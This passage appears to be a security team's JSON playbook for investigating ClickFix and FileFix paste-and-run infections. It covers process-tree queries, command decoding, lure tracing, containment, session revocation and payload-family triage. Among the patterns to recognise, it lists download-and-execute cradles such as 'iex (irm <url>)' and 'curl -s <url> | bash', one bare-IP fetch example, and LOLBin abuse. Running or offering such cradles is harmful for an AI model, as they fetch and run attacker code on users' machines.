@@ -1,0 +1,430 @@
+{
+  "id": "proc-clickfix-execution",
+  "title": "ClickFix / Fake CAPTCHA Paste-and-Run Execution",
+  "version": "1.0",
+  "detectionType": "Endpoint / Suspicious user-pasted command execution (ClickFix, FileFix, fake CAPTCHA) — CrowdStrike or Defender",
+  "severityDefault": "high",
+  "description": "A user was likely tricked by a web page or email (fake CAPTCHA, 'verify you are human', fake error or 'Fix' button) into pasting and running an attacker-supplied command via the Run dialog (Win+R), Terminal (Win+X), the File Explorer address bar (FileFix), or macOS Terminal. The command typically downloads and runs an infostealer, RAT, or loader. Because the user runs it directly, the usual download and email controls are bypassed. This procedure reconstructs the process chain, decodes the command, identifies the lure, determines how far execution got, and — if a payload ran — contains the host, addresses identity exposure (stolen passwords and session cookies), and scopes the campaign.",
+  "startNode": "intake",
+  "nodes": {
+    "intake": {
+      "type": "step",
+      "title": "Intake and capture core facts",
+      "instructions": "ClickFix (and its variants FileFix, fake CAPTCHA, fake 'browser update', fake Teams/Meet 'mic fix') is a social-engineering technique where a web page silently copies a malicious command to the user's clipboard, then instructs the user to paste and run it themselves. Because the USER runs it, it bypasses email attachment scanning, Mark-of-the-Web, SmartScreen, and most download controls. The detection you are working usually fires on the RESULT: a shell/LOLBin launched with a suspicious command line from an unusual parent.\n\nConfirm this is a new detection (not a duplicate of an open case — ClickFix campaigns hit many users at once, so check for sibling alerts in the same hour) and record:\n\n- Source platform (CrowdStrike or Defender) and the exact detection name / tactic / technique (typically T1204.004 'User Execution: Malicious Copy and Paste', T1059.001 PowerShell, T1218.005 Mshta).\n- Host: hostname, OS (Windows vs. macOS — the chain differs), primary user, business role, workstation vs. server. A ClickFix hit on a server or jump host is unusual and higher-risk.\n- The flagged process: file name, FULL command line (copy it verbatim — do not retype), process ID, SHA256.\n- The parent and grandparent processes (see next step — this is the key signal).\n- Account context: which user ran it. ClickFix almost always runs as the interactive user, not SYSTEM.\n- Detection time, and the platform's action: Prevented/Blocked, Killed, Quarantined, or Detect-only (allowed to run).\n\nWHERE TO FIND IT:\n- CrowdStrike: Endpoint Security > Endpoint detections > open the detection > Process tree / Graph. Copy the CommandLine and TargetProcessId (you will use it to pivot).\n- Defender: security.microsoft.com > Incidents & alerts > open the alert > Alert story (process tree). Click each process node for command line and hashes; note the Device ID.",
+      "evidence": [
+        {
+          "id": "source",
+          "label": "Source platform, detection name, and action taken (prevented / detect-only)",
+          "type": "text"
+        },
+        {
+          "id": "host",
+          "label": "Host (name / OS / user / role / type)",
+          "type": "textarea"
+        },
+        {
+          "id": "cmdline",
+          "label": "Flagged process + FULL verbatim command line + PID + hash",
+          "type": "textarea"
+        },
+        {
+          "id": "parents",
+          "label": "Parent / grandparent processes",
+          "type": "textarea"
+        },
+        {
+          "id": "time",
+          "label": "Detection time & related/sibling alerts",
+          "type": "text"
+        }
+      ],
+      "next": "reconstruct-chain"
+    },
+    "reconstruct-chain": {
+      "type": "step",
+      "title": "Reconstruct the process chain",
+      "instructions": "The process chain is what separates ClickFix from other execution. Build the full tree: the parent that launched the command, the command itself, and EVERYTHING it spawned afterward.\n\nWHAT A CLICKFIX CHAIN LOOKS LIKE (Windows):\n\nVariant A — Win+R (Run dialog), the most common:\n  explorer.exe  ->  powershell.exe / mshta.exe / cmd.exe / msiexec.exe / curl.exe / conhost.exe  ->  (payload)\n  The parent is explorer.exe because the Run dialog lives inside Explorer. There is no browser, Office, or script host in between — the command appears 'out of nowhere' from the desktop shell.\n\nVariant B — Win+X > Terminal / PowerShell (Admin):\n  explorer.exe -> WindowsTerminal.exe / powershell.exe (interactive console)  ->  child processes spawned by the pasted command\n  The pasted command won't be on the console's own command line; look at its children and the PSReadLine history file (below).\n\nVariant C — FileFix (pasted into the File Explorer address bar opened from a browser 'upload file' dialog):\n  chrome.exe / msedge.exe / firefox.exe  ->  powershell.exe / cmd.exe / mshta.exe\n  A BROWSER spawning a shell directly is abnormal and a strong indicator.\n\nTypical follow-on after the first stage:\n  powershell.exe -> powershell.exe (hidden, second stage)  ->  payload .exe in %APPDATA%, %LOCALAPPDATA%, %TEMP%, or %ProgramData%\n  mshta.exe -> powershell.exe -> payload\n  msiexec.exe -> MSI custom action -> payload (often a signed legit EXE that sideloads a malicious DLL from the same folder)\n  cmd.exe -> curl.exe (download) -> cmd.exe / rundll32.exe / the downloaded file\n\nmacOS variant (Terminal):\n  Terminal -> zsh/bash -> curl -> bash/sh or osascript  (commonly 'curl -s <url> | bash' or 'echo <base64> | base64 -d | bash'). The macOS payload is usually Atomic Stealer (AMOS) or a similar stealer; watch for osascript prompting the user for their password and for access to the Keychain and browser profile folders.\n\nWHAT IS NOT CLICKFIX (for contrast):\n- Office app (winword/excel/outlook) -> powershell = macro/document exploit (different playbook).\n- wscript.exe/cscript.exe opening a .js/.vbs from Downloads = user double-clicked a downloaded script.\n- Scheduled task / services.exe / an RMM agent -> powershell = automation; verify but usually not ClickFix.\n\nHOW TO LOOK — CrowdStrike (Next-Gen SIEM > Advanced event search):\n  Find the launch and siblings:\n    #event_simpleName=ProcessRollup2 ComputerName=<HOST>\n    | ParentBaseFileName=/^(explorer|chrome|msedge|firefox|brave|WindowsTerminal)\\.exe$/i\n    | FileName=/^(powershell|pwsh|mshta|cmd|msiexec|rundll32|regsvr32|curl|wscript|cscript|certutil|bitsadmin|finger|conhost|forfiles)\\.exe$/i\n    | table([@timestamp, UserName, ParentBaseFileName, FileName, CommandLine, TargetProcessId])\n  Walk DOWN the tree (repeat for each child):\n    #event_simpleName=ProcessRollup2 ParentProcessId=<TargetProcessId> | table([@timestamp, FileName, FilePath, CommandLine, TargetProcessId, SHA256HashData])\n  Or right-click the process in the detection graph > 'Explore process' to see the children visually.\n\nHOW TO LOOK — Defender (Advanced hunting, KQL):\n    DeviceProcessEvents\n    | where DeviceName startswith \"<HOST>\" and Timestamp between (datetime(<T-30m>) .. datetime(<T+2h>))\n    | where InitiatingProcessFileName in~ (\"explorer.exe\",\"chrome.exe\",\"msedge.exe\",\"firefox.exe\",\"WindowsTerminal.exe\")\n       or InitiatingProcessParentFileName =~ \"explorer.exe\"\n    | project Timestamp, AccountName, InitiatingProcessParentFileName, InitiatingProcessFileName, FileName, ProcessCommandLine, ProcessId, InitiatingProcessId, SHA256\n    | order by Timestamp asc\n  Then pivot on each child: '| where InitiatingProcessId == <ProcessId>'. The Device timeline tab (filter to the time window) gives the same picture chronologically.\n\nTHE SMOKING-GUN ARTIFACT — RunMRU (Variant A):\nEvery command typed/pasted into Win+R is saved to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU (values a, b, c... each ending in '\\1'; MRUList gives order). If the malicious command is in RunMRU, the user pasted it into the Run dialog — that is confirmation of ClickFix.\n- Defender KQL:\n    DeviceRegistryEvents\n    | where DeviceName startswith \"<HOST>\" and RegistryKey has @\"\\Explorer\\RunMRU\"\n    | project Timestamp, InitiatingProcessAccountName, RegistryValueName, RegistryValueData\n- CrowdStrike RTR (Host management > Connect to host), user hive is under HKEY_USERS\\<user SID>:\n    reg query \"HKEY_USERS\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\"\n- Defender Live Response: registry \"HKEY_USERS\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\"\n\nFor Variant B (Terminal/PowerShell window), pull the PSReadLine history, which records pasted commands:\n    C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n  (RTR: cat <path>  |  Defender Live Response: getfile <path>)\nFor macOS, check ~/.zsh_history or ~/.bash_history for the pasted curl/base64 line.\n\nRecord whether each process in the chain was allowed to run or was blocked, and note the timestamps — the gap between the browser activity and the shell launch is typically seconds to a couple of minutes.",
+      "evidence": [
+        {
+          "id": "chain",
+          "label": "Full process chain (grandparent > parent > command > children), with PIDs/timestamps",
+          "type": "textarea"
+        },
+        {
+          "id": "variant",
+          "label": "Variant identified (Win+R / Win+X Terminal / FileFix-browser / macOS Terminal / other)",
+          "type": "text"
+        },
+        {
+          "id": "runmru",
+          "label": "RunMRU / PSReadLine / shell history finding (verbatim)",
+          "type": "textarea"
+        },
+        {
+          "id": "children",
+          "label": "Child processes & dropped executables observed",
+          "type": "textarea"
+        }
+      ],
+      "next": "decode-command"
+    },
+    "decode-command": {
+      "type": "step",
+      "title": "Decode and analyze the pasted command",
+      "instructions": "ClickFix commands are deliberately obfuscated and often visually disguised. Decode the command fully so you know what it was designed to fetch and run. Work from the verbatim command line — never re-type it and NEVER run it.\n\nCOMMON PATTERNS AND HOW TO READ THEM:\n- Hidden window flags: '-w h', '-w 1', '-WindowStyle Hidden', '-NoP', 'conhost.exe --headless', 'start /min'. The user is meant to see nothing.\n- Download-and-execute cradles: 'iex (irm <url>)', 'iwr <url> | iex', '(New-Object Net.WebClient).DownloadString(<url>)', 'Invoke-Expression', 'curl -s <url> | cmd'.\n- mshta.exe <url> — mshta fetches and runs an HTA; the URL often ends in a fake extension (.mp3, .mp4, .jpg, .pdf) and the file is a polyglot with script hidden inside.\n- msiexec /i <url> /qn — silent remote MSI install.\n- Encoded commands: '-e', '-enc', '-EncodedCommand <base64>' — Base64 of UTF-16LE text.\n- String tricks: concatenation ('i'+'ex'), backticks (i`e`x), char arrays ([char]105), env-var slicing ($env:comspec[4,15,25]), reversed strings, -replace, [Convert]::FromBase64String.\n- VISUAL DECOY: a long run of spaces followed by a comment such as '# I am not a robot - reCAPTCHA Verification ID: 7713' or '# Cloudflare verification'. The Run dialog only shows the END of the line, so the user sees the harmless-looking comment and never sees the payload at the start. A long whitespace gap + verification text in a command line is essentially diagnostic of ClickFix.\n- Less common LOLBins: finger.exe <user>@<host> | cmd (payload delivered via the finger protocol, TCP/79), certutil -urlcache -f, bitsadmin /transfer, forfiles /c, wmic process call create.\n\nHOW TO DECODE:\n- CyberChef (gchq.github.io/CyberChef): for -EncodedCommand use 'From Base64' then 'Decode text' (UTF-16LE). Use 'Find / Replace' and 'Remove whitespace' to strip padding. Decode in layers; second stages are frequently encoded again.\n- If the command fetched a script (the first-stage URL), retrieve it SAFELY — through a sandbox or via urlscan.io, not from an analyst workstation. Many ClickFix servers geo-fence or serve payloads only once / only to Windows user-agents, so an empty result does not mean benign.\n\nEXTRACT AND ENRICH EVERY INDICATOR (URLs, domains, IPs, file names, hashes):\n- VirusTotal: URL/domain/IP/hash reputation; check the Relations tab (communicating files, downloaded files, contacted domains) and first-seen date. Newly registered domains with few detections are typical — low detection count is NOT a clean bill of health.\n- urlscan.io: search the domain first (search.urlscan.io) to see prior scans with page screenshots — you can often see the actual fake CAPTCHA lure. If you submit a scan, set visibility to Private or Unlisted.\n- abuse.ch URLhaus and ThreatFox: known malware-distribution URLs and C2 IOCs, often tagged 'ClickFix' / 'ClearFake' with the payload family.\n- Shodan (shodan.io/host/<IP>): for IP-based payload/C2 hosts — open ports, hosting provider, other services. Bulletproof/VPS hosting, open-directory web servers, and panels on odd ports support malicious.\n- AbuseIPDB: prior abuse reports on the IP.\n- Umbrella Investigate (if licensed): domain risk score, first-seen, WHOIS, co-occurrences, and other domains on the same IP.\n\nINTERPRETATION:\n- Remote fetch + execute + hidden window + decoy comment = malicious ClickFix with high confidence.\n- A clean, well-known vendor install one-liner (e.g. official package manager bootstrap from the vendor's own domain) run by a technical user is a known false-positive pattern — but attackers imitate these, so verify the exact domain, not just the shape.",
+      "evidence": [
+        {
+          "id": "decoded",
+          "label": "Decoded command (all layers) — what it does",
+          "type": "textarea"
+        },
+        {
+          "id": "iocs",
+          "label": "Extracted IOCs (URLs / domains / IPs / hashes)",
+          "type": "textarea"
+        },
+        {
+          "id": "intel",
+          "label": "Enrichment results (VirusTotal / urlscan / URLhaus / Shodan / Umbrella)",
+          "type": "textarea"
+        },
+        {
+          "id": "decoy",
+          "label": "Decoy/obfuscation techniques observed",
+          "type": "text"
+        }
+      ],
+      "next": "user-and-lure"
+    },
+    "user-and-lure": {
+      "type": "step",
+      "title": "Identify the lure and how the user got there",
+      "instructions": "Establish what the user was looking at when they ran the command. This confirms ClickFix, identifies infrastructure to block, and tells you who else may have been exposed.\n\nCOMMON DELIVERY PATHS:\n- Compromised legitimate website (often WordPress) injecting a fake 'Verify you are human' / Cloudflare-style checkbox overlay.\n- Malvertising or SEO-poisoned search results (e.g. searches for free software, drivers, PDF converters).\n- Phishing email: link to a lure page, or an HTML attachment that renders the fake CAPTCHA / 'document failed to load, click Fix' page locally. Frequent themes: DocuSign/invoice, Booking.com guest complaint (hospitality), GitHub 'security alert', fake Google Meet/Teams join page with a 'microphone error' fix.\n- Fake browser/software update prompts.\n\nHOW TO LOOK — Cisco Umbrella (Reporting > Activity Search):\n- Filter by the user or computer identity (roaming client or AD identity) — or the site's network identity/internal IP if the host is on-prem without the roaming client.\n- Set the window to ~30 minutes BEFORE the command ran through ~2 hours after.\n- The domains resolved just before the shell launch are your lure candidates (the page the user was on). The domains resolved right after, by the same host, are the payload/C2 candidates — they should match the URLs from the decoded command.\n- Note Umbrella's category and whether each request was Allowed or Blocked. 'Newly Seen Domains', 'Malware', 'Command and Control', 'Phishing', and 'Potentially Harmful' are all relevant.\n- LIMITATION: if the command used a bare IP address (e.g. irm http://203.0.113.10/x), there is NO DNS lookup and Umbrella will not see it. Check Meraki / EDR network telemetry instead.\n\nHOW TO LOOK — EDR browser network activity:\n- Defender KQL:\n    DeviceNetworkEvents\n    | where DeviceName startswith \"<HOST>\" and Timestamp between (datetime(<T-30m>) .. datetime(<T>))\n    | where InitiatingProcessFileName in~ (\"chrome.exe\",\"msedge.exe\",\"firefox.exe\",\"brave.exe\")\n    | summarize first=min(Timestamp), last=max(Timestamp) by RemoteUrl, RemoteIP\n- CrowdStrike:\n    #event_simpleName=DnsRequest ComputerName=<HOST>\n    | ContextBaseFileName=/^(chrome|msedge|firefox|brave)\\.exe$/i\n    | table([@timestamp, DomainName, ContextBaseFileName])\n\nHOW TO LOOK — Avanan (if the lure may have been emailed):\n- Search the user's mailbox events in the Avanan portal for messages received in the preceding hours/days containing the lure domain, or HTML attachments, or the common themes above.\n- If found: record sender, subject, recipients, and whether Avanan marked it clean/suspicious. Identify every OTHER recipient of the same campaign (same sender, subject, or URL) — they are potential victims.\n\nUSER INTERVIEW (keep it quick and non-accusatory; ask them NOT to reboot, log off, or 'clean up'):\n- What were you doing/searching for? Did a page ask you to 'verify you are human' or 'fix' an error?\n- Did it tell you to press Windows+R (or Windows+X, or open File Explorer / Terminal) and paste? Did you see a window flash?\n- Were you asked for your password afterward (macOS especially)?\n- Did you receive an email or call that sent you there? (Helpdesk-impersonation calls can use the same technique.)",
+      "evidence": [
+        {
+          "id": "lure",
+          "label": "Lure page / domain and lure theme",
+          "type": "textarea"
+        },
+        {
+          "id": "delivery",
+          "label": "Delivery path (email / compromised site / malvertising / other) + evidence",
+          "type": "textarea"
+        },
+        {
+          "id": "umbrella",
+          "label": "Umbrella timeline (pre- and post-execution domains, allowed/blocked)",
+          "type": "textarea"
+        },
+        {
+          "id": "email",
+          "label": "Avanan findings & other recipients",
+          "type": "textarea"
+        },
+        {
+          "id": "user",
+          "label": "User's account of events",
+          "type": "textarea"
+        }
+      ],
+      "next": "clickfix-confirm?"
+    },
+    "clickfix-confirm?": {
+      "type": "decision",
+      "title": "Is this a genuine ClickFix execution?",
+      "instructions": "Confirmed ClickFix: shell/LOLBin launched from explorer.exe (Run dialog), a Terminal window, or a browser; command fetches and runs remote content; obfuscation/hidden window/decoy comment; RunMRU or shell history shows it was pasted; and/or the user describes a verify/fix prompt.\nBenign: a recognized administrator or developer ran a legitimate command from a known vendor/internal domain, the user can explain it, and the content fetched is verifiably legitimate.\nIf you cannot reach the user or the evidence is mixed, treat it as ClickFix — the cost of a missed stealer infection is far higher than an extra containment.",
+      "options": [
+        {
+          "label": "Confirmed ClickFix / FileFix lure execution",
+          "next": "execution-outcome?",
+          "note": "User was socially engineered into running attacker code."
+        },
+        {
+          "label": "Suspicious but unconfirmed — treat as ClickFix",
+          "next": "execution-outcome?",
+          "note": "Prefer the higher-risk interpretation."
+        },
+        {
+          "label": "Verified legitimate admin/developer command",
+          "next": "benign-close",
+          "note": "False positive; document and tune."
+        }
+      ]
+    },
+    "execution-outcome?": {
+      "type": "decision",
+      "title": "How far did execution get?",
+      "instructions": "Use the process tree, network telemetry, and file-write telemetry you collected to decide how far the chain progressed.\n\n- 'Prevented' means the EDR blocked/killed the first-stage process before it made any outbound connection — confirm there is no network event from that PID.\n- 'Retrieval failed/blocked' means the first stage ran but the payload fetch was blocked (Umbrella block, Meraki block, AMSI/script block, HTTP 404/connection refused) and no child payload process or new executable appears.\n- 'Payload retrieved/executed' means ANY successful download, new executable/script written by the chain, second-stage process, persistence, or outbound connection to non-lure infrastructure. If you cannot rule this out, choose this option.\n\nNote: an EDR 'Prevented' verdict on one process does not mean the whole chain was stopped — attackers often use two or three parallel/fallback methods. Check for siblings.",
+      "options": [
+        {
+          "label": "Prevented before any network retrieval",
+          "next": "blocked-verify",
+          "note": "Verify nothing else got through."
+        },
+        {
+          "label": "Command ran but payload retrieval failed/blocked",
+          "next": "blocked-verify",
+          "note": "Verify no second stage or fallback."
+        },
+        {
+          "label": "Payload retrieved and/or executed (or cannot rule out)",
+          "next": "contain-host",
+          "note": "Treat as active infection — contain first."
+        }
+      ]
+    },
+    "blocked-verify": {
+      "type": "step",
+      "title": "Verify nothing got through (required even when blocked)",
+      "instructions": "A blocked first stage is common, but ClickFix scripts often include fallback URLs, and users sometimes retry the paste when 'nothing happened'. Prove the host is clean before closing.\n\n- Check for REPEATED attempts: the user may have run the command 2-3 times, or run a second variant from a different lure. Re-run the process-chain queries for the full day, not just the alert window.\n- Check for files written by any process in the chain:\n  Defender:\n    DeviceFileEvents\n    | where DeviceName startswith \"<HOST>\" and Timestamp > datetime(<T-5m>)\n    | where InitiatingProcessFileName in~ (\"powershell.exe\",\"mshta.exe\",\"cmd.exe\",\"msiexec.exe\",\"curl.exe\",\"rundll32.exe\")\n    | where FolderPath has_any (\"\\\\AppData\\\\\",\"\\\\Temp\\\\\",\"\\\\ProgramData\\\\\",\"\\\\Public\\\\\")\n    | project Timestamp, ActionType, FolderPath, FileName, SHA256, InitiatingProcessCommandLine\n  CrowdStrike:\n    #event_simpleName=/(FileWritten|ExecutableWritten)$/ ComputerName=<HOST>\n    | ContextBaseFileName=/^(powershell|mshta|cmd|msiexec|curl|rundll32)\\.exe$/i\n    | table([@timestamp, #event_simpleName, TargetFileName, ContextBaseFileName])\n- Check for outbound connections from the chain to anything other than the (blocked) payload host — Defender DeviceNetworkEvents by InitiatingProcessId; CrowdStrike NetworkConnectIP4 / DnsRequest by ContextProcessId.\n- Check persistence created since the event: Run/RunOnce keys, Startup folder, scheduled tasks (CrowdStrike: #event_simpleName=/^(AsepValueUpdate|ScheduledTaskRegistered)$/; Defender: DeviceRegistryEvents on \\CurrentVersion\\Run and DeviceEvents ActionType == \"ScheduledTaskCreated\").\n- Confirm the block itself: Umbrella shows 'Blocked' for the payload domain; for IP-based fetches check Meraki (Security & SD-WAN > Security center for IDS/AMP events for the client; Network-wide > Clients > the host for traffic; or Meraki flow logs in the SIEM if syslog forwarding is enabled).\n- Run an on-demand full scan (Defender) or confirm no further detections (CrowdStrike) on the host.",
+      "evidence": [
+        {
+          "id": "retries",
+          "label": "Repeat/alternate executions found?",
+          "type": "textarea"
+        },
+        {
+          "id": "files",
+          "label": "Files written by the chain (or none)",
+          "type": "textarea"
+        },
+        {
+          "id": "net",
+          "label": "Outbound connections / block confirmation (Umbrella / Meraki)",
+          "type": "textarea"
+        },
+        {
+          "id": "persist",
+          "label": "Persistence check result",
+          "type": "text"
+        }
+      ],
+      "next": "blocked-verdict?"
+    },
+    "blocked-verdict?": {
+      "type": "decision",
+      "title": "Did the verification find anything?",
+      "instructions": "Any payload on disk, second-stage process, persistence, or successful connection to attacker infrastructure means the block was incomplete — treat as infected. Only a verified-clean host proceeds to blocking and closure.",
+      "options": [
+        {
+          "label": "Evidence something got through",
+          "next": "contain-host",
+          "note": "Block was incomplete — contain."
+        },
+        {
+          "label": "Verified clean — nothing executed beyond the blocked stage",
+          "next": "lure-block",
+          "note": "Block infrastructure and hunt other victims."
+        }
+      ]
+    },
+    "lure-block": {
+      "type": "step",
+      "title": "Block the infrastructure and hunt for other victims",
+      "instructions": "Even with this host clean, the lure is still live and likely targeting others. ClickFix campaigns are rarely one-user events.\n\nBLOCK:\n- Umbrella: add the lure domain(s) and payload/C2 domains to a block Destination List applied to all policies.\n- Meraki: for IP-based payload/C2 hosts, add Layer 3 deny rules (Security & SD-WAN > Firewall) and/or blocked URL patterns in Content filtering.\n- CrowdStrike: Endpoint security > IOC management — add payload hashes (block) and domains/IPs (detect).\n- Defender: Settings > Endpoints > Indicators — add URLs/domains, IPs, and file hashes with Block action (requires Network Protection in block mode for URL/IP enforcement).\n- Avanan: if emailed, block the sender/domain and quarantine the message from ALL recipients' mailboxes.\n\nHUNT FLEET-WIDE (last 7-14 days):\n- Umbrella Activity Search on the lure and payload domains across ALL identities.\n- Defender:\n    DeviceRegistryEvents\n    | where Timestamp > ago(14d) and RegistryKey has @\"\\Explorer\\RunMRU\"\n    | where RegistryValueData matches regex @\"(?i)(https?://|iex|irm|iwr|mshta|-enc|curl|captcha|robot|verif)\"\n    | project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryValueData\n  plus a DeviceProcessEvents search for the extracted domains/IPs in ProcessCommandLine.\n- CrowdStrike:\n    #event_simpleName=ProcessRollup2 CommandLine=/(<domain1>|<domain2>|<ip>)/i\n    | table([@timestamp, ComputerName, UserName, ParentBaseFileName, CommandLine])\n    #event_simpleName=DnsRequest DomainName=/(<domain1>|<domain2>)/i | groupBy([ComputerName])\n\nUSER FOLLOW-UP: brief the user (no legitimate site ever asks you to paste a command into Windows+R or Terminal to prove you are human) and consider a targeted awareness note if multiple users were lured.",
+      "evidence": [
+        {
+          "id": "blocks",
+          "label": "Blocks applied (Umbrella / Meraki / CrowdStrike / Defender / Avanan)",
+          "type": "textarea"
+        },
+        {
+          "id": "hunt",
+          "label": "Fleet hunt results — other hosts/users that visited or executed",
+          "type": "textarea"
+        }
+      ],
+      "next": "hunt-verdict?"
+    },
+    "hunt-verdict?": {
+      "type": "decision",
+      "title": "Did the hunt find other users who executed the command?",
+      "instructions": "Other users merely VISITING the lure domain (DNS only, no shell execution) can be handled as exposure notes. Any other host where the command actually RAN must be investigated as its own infection.",
+      "options": [
+        {
+          "label": "No other executions — this user only (visits at most)",
+          "next": "close-blocked",
+          "note": "Close with blocks in place."
+        },
+        {
+          "label": "Other hosts executed the command",
+          "next": "contain-host",
+          "note": "Contain the additional hosts and scope as a campaign."
+        }
+      ]
+    },
+    "contain-host": {
+      "type": "step",
+      "title": "Contain the host (capture volatile evidence first)",
+      "instructions": "ClickFix payloads are overwhelmingly infostealers and RATs — stealers exfiltrate in seconds to minutes, RATs give hands-on-keyboard access. Move fast, but grab volatile evidence before you kill anything. Tell the user NOT to reboot or log off.\n\nCAPTURE (2-5 minutes):\n- CrowdStrike RTR: 'ps' (running processes), 'netstat' (live connections), 'reg query' the RunMRU and Run keys, and 'memdump <pid>' of the payload process if active responder rights allow. 'get <path>' the payload file(s).\n- Defender Live Response: 'processes', 'connections', 'registry <key>', 'getfile <path>'. Also 'Collect investigation package' from the device page.\n\nCONTAIN:\n- Isolate the host: CrowdStrike 'Network contain' / Defender 'Isolate device' (Full). Both keep the EDR console and RTR/Live Response connection working.\n- Kill payload processes and quarantine the payload files (RTR 'kill' / 'rm' after collection; Defender 'Stop and quarantine file').\n- Block all extracted IOCs fleet-wide (Umbrella destination list, Meraki L3 deny for IPs, CrowdStrike IOC management, Defender Indicators) — see lure-block step for locations.\n- IDENTITY (do NOT wait for full analysis if a stealer is suspected): revoke all sessions for the user in BOTH identity providers —\n  Entra ID: Users > <user> > Revoke sessions (or Revoke-MgUserSignInSession).\n  Okta: Directory > People > <user> > More Actions > Clear User Sessions (include revoking OAuth tokens/refresh tokens).\n  Then force a password reset from a DIFFERENT, clean device. Resetting the password alone does not kill stolen session cookies — the session revocation is the critical part.\n- Record every action with a timestamp.",
+      "evidence": [
+        {
+          "id": "volatile",
+          "label": "Volatile evidence captured (processes / connections / memory / files)",
+          "type": "textarea"
+        },
+        {
+          "id": "isolation",
+          "label": "Host isolation (platform / time)",
+          "type": "text"
+        },
+        {
+          "id": "blocks",
+          "label": "Kills, quarantines, IOC blocks applied",
+          "type": "textarea"
+        },
+        {
+          "id": "creds",
+          "label": "Sessions revoked & password reset (Entra / Okta, times)",
+          "type": "textarea"
+        }
+      ],
+      "next": "payload-analysis",
+      "playbook": "CONTAINMENT"
+    },
+    "payload-analysis": {
+      "type": "step",
+      "title": "Analyze the payload and what it did",
+      "instructions": "Identify what was delivered, because the family determines what was stolen and what must be reset.\n\nIDENTIFY THE PAYLOAD:\n- Collect hashes of every file written by the chain and check VirusTotal, MalwareBazaar (bazaar.abuse.ch), and ThreatFox for family attribution.\n- Detonate unknown samples in a sandbox (ANY.RUN, Joe Sandbox, Hybrid Analysis — use private submission if the sample could contain company data or tenant identifiers).\n\nCOMMON CLICKFIX PAYLOAD FAMILIES AND THEIR TELLS:\n- Infostealers (most common): Lumma, StealC, Vidar, Rhadamanthys, Atomic/AMOS (macOS). Tells: a non-browser process reading browser profile files (Login Data, Cookies, Web Data, Local State) and crypto-wallet extension folders; files collected into a temp folder/zip; a burst of HTTPS POSTs to a C2; some use Steam/Telegram profile pages as dead-drop resolvers for the C2 address. Many run once and exit without persistence — absence of persistence does NOT mean nothing was stolen.\n  Defender: DeviceEvents | where DeviceName startswith \"<HOST>\" and ActionType == \"SensitiveFileRead\" (where available) — shows access to browser credential stores.\n  Defender/CrowdStrike file telemetry: look for new .zip/.7z in %TEMP% or %APPDATA% shortly after execution.\n- RATs / remote access: NetSupport RAT (client32.exe with client32.ini in a random folder under %APPDATA% or %ProgramData%), AsyncRAT, Remcos, SectopRAT, DarkGate. Tells: persistence (Run key / scheduled task / startup shortcut), long-lived beaconing connection, a legitimate-looking signed EXE in a user-writable path.\n- Loaders: Latrodectus, HijackLoader/IDAT, GHOSTPULSE, MSI-based sideloaders. Tells: signed legit EXE + malicious DLL in the same folder (DLL sideloading), process injection into explorer.exe/msbuild.exe/regasm.exe, further downloads.\n\nDETERMINE WHAT RAN AND WHAT IT TOUCHED:\n- Full descendant process tree from the first-stage process (repeat the ParentProcessId / InitiatingProcessId pivots until the tree ends).\n- Every outbound destination (Defender DeviceNetworkEvents / CrowdStrike NetworkConnectIP4 + DnsRequest by ContextProcessId), enriched in VirusTotal, Shodan, AbuseIPDB.\n- Umbrella: every domain the host resolved after execution — look for C2 patterns (regular intervals, newly seen domains, DGA-looking names).\n- Meraki: data volume to C2 IPs (client traffic view or flow logs) — a rough gauge of exfiltration size.\n- Persistence created (Run keys, scheduled tasks, services, startup folder, WMI subscriptions).\n- For macOS/AMOS: osascript password prompts, access to ~/Library/Keychains, browser profile directories, Notes, and curl POSTs of a zip from /tmp.",
+      "evidence": [
+        {
+          "id": "payload",
+          "label": "Payload files (path / hash / family / sandbox result)",
+          "type": "textarea"
+        },
+        {
+          "id": "tree",
+          "label": "Full descendant process tree",
+          "type": "textarea"
+        },
+        {
+          "id": "c2",
+          "label": "C2 / exfil destinations (enriched) and data volume",
+          "type": "textarea"
+        },
+        {
+          "id": "persistence",
+          "label": "Persistence mechanisms found",
+          "type": "textarea"
+        }
+      ],
+      "next": "payload-class?"
+    },
+    "payload-class?": {
+      "type": "decision",
+      "title": "What class of payload is it?",
+      "instructions": "Stealers are a data-theft and identity problem; RATs and loaders are an intrusion problem that can lead to lateral movement and ransomware. If it is both (e.g. a loader that dropped a stealer) or unknown, choose the RAT/loader path — it includes everything the stealer path does.",
+      "options": [
+        {
+          "label": "Infostealer (run-once credential/cookie theft)",
+          "next": "identity-exposure",
+          "note": "Focus on identity and data exposure."
+        },
+        {
+          "label": "RAT / loader / unknown or mixed",
+          "next": "hok-review",
+          "note": "Check for hands-on-keyboard activity first."
+        }
+      ]
+    },
+    "hok-review": {
+      "type": "step",
+      "title": "Check for hands-on-keyboard and lateral activity",
+      "instructions": "A RAT or loader gives an operator interactive access. Look for signs a human used it — this is a common ransomware and data-theft precursor.\n\n- Discovery commands spawned under the RAT/payload process or its injected host: whoami, whoami /groups, net user/group /domain, nltest /dclist, nltest /domain_trusts, systeminfo, ipconfig /all, arp -a, quser, tasklist, AdFind, SharpHound/BloodHound.\n  Defender: DeviceProcessEvents | where DeviceName startswith \"<HOST>\" and FileName in~ (\"whoami.exe\",\"net.exe\",\"net1.exe\",\"nltest.exe\",\"systeminfo.exe\",\"quser.exe\",\"arp.exe\",\"adfind.exe\")\n  CrowdStrike: #event_simpleName=ProcessRollup2 ComputerName=<HOST> FileName=/^(whoami|net1?|nltest|systeminfo|quser|arp|adfind)\\.exe$/i\n- Credential access: LSASS access/dumps, SAM/SECURITY hive saves, browser credential theft by the RAT.\n- Additional tools dropped: second RMM (AnyDesk, ScreenConnect), tunneling (ngrok, Cloudflared, Chisel), Cobalt Strike or other C2 beacons — each warrants the relevant playbook.\n- Lateral movement FROM this host: outbound RDP (3389), SMB (445), WinRM (5985/5986), PsExec/service creation on other hosts.\n  Defender: DeviceNetworkEvents | where DeviceName startswith \"<HOST>\" and RemotePort in (3389, 445, 5985, 5986) and Timestamp > datetime(<T>)\n  CrowdStrike: #event_simpleName=NetworkConnectIP4 ComputerName=<HOST> RemotePort=/^(3389|445|5985|5986)$/\n- Meraki: unusual internal east-west traffic or new outbound destinations from this client after execution.",
+      "evidence": [
+        {
+          "id": "discovery",
